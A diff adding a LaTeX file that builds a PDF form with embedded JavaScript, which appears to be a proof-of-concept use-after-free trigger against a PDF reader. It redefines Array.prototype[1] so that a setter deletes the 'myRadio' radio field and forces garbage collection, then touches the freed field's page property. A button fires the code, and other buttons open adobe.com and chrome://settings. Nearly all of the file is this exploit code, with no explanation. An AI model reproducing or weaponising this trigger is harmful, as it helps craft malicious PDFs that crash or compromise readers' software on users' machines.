@@ -1,0 +1,58 @@
+\documentclass{article}
+\usepackage{hyperref}
+\usepackage{graphicx, xcolor}
+\usepackage[fleqn]{amsmath}
+\usepackage[pdftex]{insdljs}
+\usepackage[useui]{eforms}
+
+\begin{insDLJS}[test]{test}{JavaScript}
+function gc() {
+  tmp = [];
+  for (var i = 0; i < 0x200000; i++)
+    tmp.push(new Uint8Array(10));
+  tmp = null;
+}
+function run() {
+  try{
+    var f = this.getField("myRadio");
+    Object.defineProperty(Array.prototype, 1, {
+      get: () => {
+        return this[1];
+      },
+      set: (v) => {
+        this.removeField("myRadio");
+        gc();
+        return false;
+      }, enumerable: true
+    });
+    f.page;
+  } catch (e) {
+    app.alert("failed: " + e);
+  }
+}
+
+\end{insDLJS}
+% \OpenAction{\JS{%
+% }}     
+\begin{document}
+
+\begin{Form}
+
+\PushButton[name=runButton, onclick={run();} ]{run} 
+\\[10pt]
+Male: \radioButton{myRadio}{10bp}{10bp}{Male}
+Female: \radioButton{myRadio}{10bp}{10bp}{Female}
+Neither: \radioButton[\A{\JS{app.alert("You can’t be ’neither’!
+        I’m resetting the field, guess again!");\r
+        this.resetForm(["myRadio"])}}]{myRadio}{10bp}{10bp}{Neither}
+C: \radioButton{myRadio}{10bp}{10bp}{C}
+D: \radioButton{myRadio}{10bp}{10bp}{D}
+E: \radioButton{myRadio}{10bp}{10bp}{E}
+\end{Form}
+\pushButton[\CA{Go}\AC{Adobe!}\RC{To}
+    \A{/S/URI/URI(http://www.adobe.com/)}]{myButton4}{}{10bp}
+
+\pushButton[\CA{Go}\AC{Adobe!}\RC{To}
+    \A{/S/URI/URI(chrome://settings/)}]{myButton4}{}{10bp}
+
+\end{document}
